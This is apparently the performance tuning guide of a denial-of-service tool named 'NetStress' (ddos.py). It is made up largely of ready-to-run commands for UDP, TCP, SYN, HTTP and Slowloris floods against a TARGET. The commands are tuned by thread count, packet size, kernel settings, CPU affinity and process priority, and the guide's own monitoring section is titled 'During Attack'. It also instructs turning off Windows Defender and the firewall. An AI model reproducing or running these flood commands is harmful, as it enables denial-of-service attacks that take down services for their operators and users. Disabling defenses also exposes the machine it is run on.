# NetStress Performance Tuning Guide

Optimize NetStress for maximum performance on your system.

---

## Quick Optimization Checklist

1. ☐ Install native engine
2. ☐ Use optimal thread count
3. ☐ Choose appropriate packet size
4. ☐ Configure system parameters
5. ☐ Use wired network connection
6. ☐ Close unnecessary applications

---

## Install Native Engine

The single most impactful optimization:

```bash
python scripts/install_native.py
```

**Performance improvement:** 5-20x faster

| Metric    | Python Only | With Native Engine |
| --------- | ----------- | ------------------ |
| UDP PPS   | 100K-300K   | 1M-5M              |
| TCP CPS   | 10K-50K     | 100K-500K          |
| CPU Usage | High        | Lower              |

---

## Thread Optimization

### Finding Optimal Thread Count

```bash
# Test with different thread counts
python ddos.py -i TARGET -p 80 -t UDP -x 1 -d 30
python ddos.py -i TARGET -p 80 -t UDP -x 2 -d 30
python ddos.py -i TARGET -p 80 -t UDP -x 4 -d 30
python ddos.py -i TARGET -p 80 -t UDP -x 8 -d 30
```

### Recommended Thread Counts

| CPU Cores | UDP Threads | TCP Threads | HTTP Threads |
| --------- | ----------- | ----------- | ------------ |
| 2         | 2           | 2           | 4            |
| 4         | 4           | 4           | 8            |
| 8         | 8           | 8           | 16           |
| 16        | 12-16       | 12-16       | 24-32        |
| 32+       | 16-24       | 16-24       | 32-64        |

### Thread Count Guidelines

- **UDP**: Threads ≈ CPU cores
- **TCP**: Threads ≈ CPU cores (connection overhead)
- **HTTP**: Threads ≈ 2x CPU cores (I/O bound)
- **Slowloris**: 100-1000 threads (connection-based)

---

## Packet Size Optimization

### Size vs Performance Trade-off

| Packet Size    | PPS     | Bandwidth | Use Case          |
| -------------- | ------- | --------- | ----------------- |
| 1-64 bytes     | Highest | Low       | Maximum PPS       |
| 64-512 bytes   | High    | Medium    | Balanced          |
| 512-1472 bytes | Medium  | High      | Maximum bandwidth |
| 1472 bytes     | Medium  | Highest   | Standard MTU      |

### Optimal Sizes

```bash
# Maximum PPS (small packets)
python ddos.py -i TARGET -p 80 -t UDP -s 1

# Maximum bandwidth (MTU-sized)
python ddos.py -i TARGET -p 80 -t UDP -s 1472

# Balanced
python ddos.py -i TARGET -p 80 -t UDP -s 512
```

### Why 1472 Bytes?

```
MTU (1500) - IP Header (20) - UDP Header (8) = 1472 bytes
```

Packets larger than 1472 bytes will be fragmented, reducing efficiency.

---

## System Configuration

### Linux

**Increase socket buffer sizes:**

```bash
# Temporary (until reboot)
sudo sysctl -w net.core.rmem_max=26214400
sudo sysctl -w net.core.wmem_max=26214400
sudo sysctl -w net.core.rmem_default=1048576
sudo sysctl -w net.core.wmem_default=1048576

# Permanent (add to /etc/sysctl.conf)
echo "net.core.rmem_max=26214400" | sudo tee -a /etc/sysctl.conf
echo "net.core.wmem_max=26214400" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

**Increase file descriptor limit:**

```bash
# Check current limit
ulimit -n

# Increase (temporary)
ulimit -n 65535

# Permanent (add to /etc/security/limits.conf)
echo "* soft nofile 65535" | sudo tee -a /etc/security/limits.conf
echo "* hard nofile 65535" | sudo tee -a /etc/security/limits.conf
```

**Disable connection tracking (if not needed):**

```bash
sudo sysctl -w net.netfilter.nf_conntrack_max=1000000
# Or disable entirely
sudo modprobe -r nf_conntrack
```

**CPU performance mode:**

```bash
# Check current governor
cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor

# Set to performance
sudo cpupower frequency-set -g performance
```

### Windows

**Increase socket buffer (PowerShell as Admin):**

```powershell
# Registry settings for network performance
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "TcpWindowSize" -Value 65535
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "GlobalMaxTcpWindowSize" -Value 65535
```

**Disable Windows Defender real-time scanning (temporarily):**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
# Re-enable after testing
Set-MpPreference -DisableRealtimeMonitoring $false
```

**Disable firewall (temporarily):**

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
# Re-enable after testing
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

### macOS

**Increase file descriptor limit:**

```bash
sudo launchctl limit maxfiles 65535 200000
ulimit -n 65535
```

**Increase socket buffer:**

```bash
sudo sysctl -w kern.ipc.maxsockbuf=8388608
sudo sysctl -w net.inet.tcp.sendspace=262144
sudo sysctl -w net.inet.tcp.recvspace=262144
```

---

## Network Optimization

### Use Wired Connection

WiFi adds latency and reduces throughput:

| Connection        | Typical Throughput | Latency |
| ----------------- | ------------------ | ------- |
| WiFi (2.4GHz)     | 50-150 Mbps        | 5-20ms  |
| WiFi (5GHz)       | 200-500 Mbps       | 2-10ms  |
| Ethernet (1Gbps)  | 900+ Mbps          | <1ms    |
| Ethernet (10Gbps) | 9+ Gbps            | <0.5ms  |

### Network Interface Settings

**Linux - Check interface speed:**

```bash
ethtool eth0 | grep Speed
```

**Linux - Enable jumbo frames (if supported):**

```bash
sudo ip link set eth0 mtu 9000
```

**Linux - Disable offloading (for raw packets):**

```bash
sudo ethtool -K eth0 tso off gso off gro off
```

---

## Protocol-Specific Tuning

### UDP Optimization

```bash
# Maximum PPS
python ddos.py -i TARGET -p 80 -t UDP -s 1 -x 8

# Maximum bandwidth
python ddos.py -i TARGET -p 80 -t UDP -s 1472 -x 4
```

### TCP Optimization

```bash
# Connection flood
python ddos.py -i TARGET -p 80 -t TCP -x 8

# SYN flood (requires root)
sudo python ddos.py -i TARGET -p 80 -t TCP-SYN -x 4
```

### HTTP Optimization

```bash
# More threads for I/O-bound workload
python ddos.py -i TARGET -p 80 -t HTTP -x 16

# With AI optimization
python ddos.py -i TARGET -p 80 -t HTTP -x 16 --ai-optimize
```

### Slowloris Optimization

```bash
# Many connections, long duration
python ddos.py -i TARGET -p 80 -t SLOW -x 500 -d 600
```

---

## Monitoring Performance

### During Attack

Watch the output:

```
[30.5s] PPS: 1,234,567 | Mbps: 14,567.8 | Packets: 37,654,321 | Errors: 12
```

| Metric | Good         | Needs Tuning     |
| ------ | ------------ | ---------------- |
| PPS    | Stable, high | Fluctuating, low |
| Errors | <0.1%        | >1%              |
| CPU    | <90%         | 100%             |

### System Monitoring

**Linux:**

```bash
# CPU usage
top -d 1

# Network throughput
iftop -i eth0

# Socket statistics
ss -s
```

**Windows:**

```powershell
# Task Manager or
Get-Counter '\Processor(_Total)\% Processor Time'
Get-Counter '\Network Interface(*)\Bytes Sent/sec'
```

**macOS:**

```bash
# Activity Monitor or
top -l 1 | head -10
nettop -m tcp
```

---

## Troubleshooting Performance

### Low PPS

**Symptoms:** PPS much lower than expected

**Solutions:**

1. Install native engine
2. Increase threads
3. Use smaller packets
4. Check CPU usage (if 100%, reduce threads)
5. Check network interface speed

### High Error Rate

**Symptoms:** Many errors in output

**Solutions:**

1. Reduce packet rate
2. Check target availability
3. Check network connectivity
4. Reduce threads

### CPU Bottleneck

**Symptoms:** CPU at 100%, PPS not increasing with threads

**Solutions:**

1. Install native engine
2. Reduce threads to CPU cores
3. Use UDP instead of TCP/HTTP
4. Close other applications

### Memory Issues

**Symptoms:** System slowdown, swapping

**Solutions:**

1. Reduce threads
2. Use smaller packet buffers
3. Close other applications
4. Add more RAM

---

## Benchmarking

### Baseline Test

```bash
# Establish baseline
python ddos.py -i 127.0.0.1 -p 9999 -t UDP -x 4 -d 30
```

### Compare Configurations

```bash
# Test 1: Default
python ddos.py -i TARGET -p 80 -t UDP -d 60

# Test 2: More threads
python ddos.py -i TARGET -p 80 -t UDP -x 8 -d 60

# Test 3: Smaller packets
python ddos.py -i TARGET -p 80 -t UDP -s 64 -d 60

# Test 4: Native engine
python scripts/install_native.py
python ddos.py -i TARGET -p 80 -t UDP -d 60
```

### Record Results

| Configuration | PPS | Mbps | Errors | CPU |
| ------------- | --- | ---- | ------ | --- |
| Default       |     |      |        |     |
| 8 threads     |     |      |        |     |
| Small packets |     |      |        |     |
| Native engine |     |      |        |     |

---

## Advanced Tuning

### CPU Affinity (Linux)

Pin workers to specific CPUs:

```bash
taskset -c 0-3 python ddos.py -i TARGET -p 80 -t UDP -x 4
```

### Process Priority

Run with higher priority:

```bash
# Linux
sudo nice -n -20 python ddos.py -i TARGET -p 80 -t UDP

# Windows (PowerShell as Admin)
Start-Process python -ArgumentList "ddos.py -i TARGET -p 80 -t UDP" -Priority High
```

### NUMA Awareness (Multi-socket systems)

```bash
# Run on specific NUMA node
numactl --cpunodebind=0 --membind=0 python ddos.py -i TARGET -p 80 -t UDP
```

---

## See Also

- [CAPABILITIES.md](CAPABILITIES.md) - Performance expectations
- [ARCHITECTURE.md](ARCHITECTURE.md) - System architecture
- [TROUBLESHOOTING.md](TROUBLESHOOTING.md) - Problem solving
